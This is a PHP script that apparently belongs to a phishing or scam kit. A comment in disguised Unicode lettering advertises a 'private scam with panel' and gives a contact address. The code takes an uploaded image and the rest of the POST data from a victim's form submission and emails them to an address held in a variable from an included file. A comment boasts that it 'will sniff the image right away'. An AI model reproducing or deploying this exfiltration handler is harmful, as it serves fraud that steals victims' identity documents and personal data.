<?php
/*
yoυ wan'т a prιvaтe ѕcaм wιтн panel and oтнer opтιonѕ? => ix@oυтlooĸ.fr
*/ 
require "../../MoBamba.php";
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
/*
Tested working with PHP5.4 and above (including PHP 7 )
Fastest Images uploader 2019 on the earth he will sniff the image right away.
 */
require_once '../../vendor/autoload.php';

use FormGuide\Handlx\FormHandler;


$pp = new FormHandler(); 

$pp->attachFiles(['image']);


$pp->sendEmailTo($getmail);

echo $pp->process($_POST);                                       